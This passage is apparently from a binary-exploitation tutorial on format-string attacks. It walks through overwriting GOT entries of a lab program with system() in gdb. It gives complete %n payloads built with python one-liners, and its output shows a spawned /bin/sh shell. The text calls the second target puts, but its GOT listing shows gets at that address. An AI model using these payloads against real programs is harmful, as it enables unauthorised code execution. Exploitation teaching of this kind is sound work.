DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
0804b268 R_386_GLOB_DAT    __gmon_start__
0804b278 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804b27c R_386_JUMP_SLOT   gets@GLIBC_2.0
0804b280 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804b284 R_386_JUMP_SLOT   strncpy@GLIBC_2.0
```

Let's try to overwrite it in gdb. For this, you need to do the same as above in the exploitation of vulnerability:

1. Determine the function that is similar to system() or execve() and in which program puts the arguments that you can control.
2. Determine the address of the system or execve.
3. Specify the address within GOT table.
4. Overwrite it with the address of the system or execve.

### Determine the function as a target

In my program `got-overwrite.c`, you can find the place where it takes another output interactively in another buffer `buff2`. So, the printf is a nice candidate for overwriting within GOT table. But here the problem - the address of printf within GOT is placed above the address of puts. So, if you will overwrite printf, you also overwrite the next 2 bytes of puts address and it will not allow you to exploit the program. Thus, you also need to overwrite the puts address with it.

### Determine the address of system or execve

In gdb:
```bash
gef➤  print system
$1 = {<text variable, no debug info>} 0xf7e02830 <system>
```

So, this is the address which you will write in GOT.

### Specify the address within GOT table

Let's try to exploit it without overwriting puts. I'll not specify how to determine the address and direct parameter number, you can do it yourself.
```bash
gef➤  b *main + 138
Breakpoint 1 at 0x8049260
gef➤  r aaaa
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/got-overwrite aaaa
aaaaaaaa

Breakpoint 1, 0x08049260 in main ()
gef➤  got

GOT protection: No RelRO | GOT functions: 4

[0x804b278] printf@GLIBC_2.0  →  0xf7e11340
[0x804b27c] gets@GLIBC_2.0  →  0xf7e2e1b0
[0x804b280] __libc_start_main@GLIBC_2.0  →  0xf7ddbdf0
[0x804b284] strncpy@GLIBC_2.0  →  0xf7e58690
gef➤  r $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "%10280u" + "%54$n" + "%53168u" + "%55$n"')
Starting program: /home/shogun/repos/basics-of-pwn/content/format-string/got-overwrite $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "%10280u" + "%54$n" + "%53168u" + "%55$n"')
xz

Program received signal SIGSEGV, Segmentation fault.
0x08040000 in ?? ()
gef➤  got

GOT protection: No RelRO | GOT functions: 4

[0x804b278] printf@GLIBC_2.0  →  0xf7e02830
[0x804b27c] gets@GLIBC_2.0  →  0x8040000
[0x804b280] __libc_start_main@GLIBC_2.0  →  0xf7ddbdf0
[0x804b284] strncpy@GLIBC_2.0  →  0xf7e58690
gef➤
```
Here, you see that the printf now has another address, but `puts` has too. That's why you need the next overwrite.

### Overwrite it with the address of the system

Now, after the first write in GOT, do next write. I can't show you all output, because the format string just places the large empty space between the command and result:
```bash
gef➤  r $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "\x7c\xb2\x04\x08" + "\x7e\xb2\x04\x08" + "%10272u" + "%54$n" + "%53168u" + "%55$n" + "%59856u" + "%56$n" + "%5682u" + "%57$n"')

================
space here
================

0/bin/sh
[Detaching after vfork from child process 7246]
$ w
16:08:13 up 42 min,  1 user,  load average: 0.16, 0.50, 0.50
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
shogun   tty7     :0               15:25   42:37   1:15   1.33s xfce4-session
$
```

Try it outside gdb:
```bash
shogun@kyoto:~/repos/basics-of-pwn/content/format-string$ ./got-overwrite $(python -c 'print "\x78\xb2\x04\x08" + "\x7a\xb2\x04\x08" + "\x7c\xb2\x04\x08" + "\x7e\xb2\x04\x08" + "%10272u" + "%54$n" + "%53168u" + "%55$n" + "%59856u" + "%56$n" + "%5682u" + "%57$n"')
xz|~                                                                                                                                                                                                                   =====
space
=====                                                                                                                                                                     4294955702                                                                                                                                                                                                             =====
space
=====                                                                           200                                                                                                                                                                                                                    =====
space
=====
134517236                                                                                                                                                                                                              
=====
space
=====
0/bin/sh
$
```

Thus, after the puts placed input string in buff2, you call the system function and it executes the command which you input in buff2.
